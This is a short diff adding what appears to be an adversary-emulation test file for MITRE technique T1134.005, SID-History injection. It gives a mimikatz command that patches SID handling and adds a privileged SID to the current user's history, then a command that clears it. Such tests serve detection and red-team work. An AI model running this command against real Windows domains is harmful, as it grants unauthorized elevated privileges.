@@ -1,0 +1,10 @@
+################T1134.005.md################
+
+##Atomic Test #1 - Injection SID-History with mimikatz
+
+```mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username" "exit"```
+
+#Borrado
+```mimikatz.exe "sid::clear /sam:$env:username" "exit"```
+
+```PAUSE```
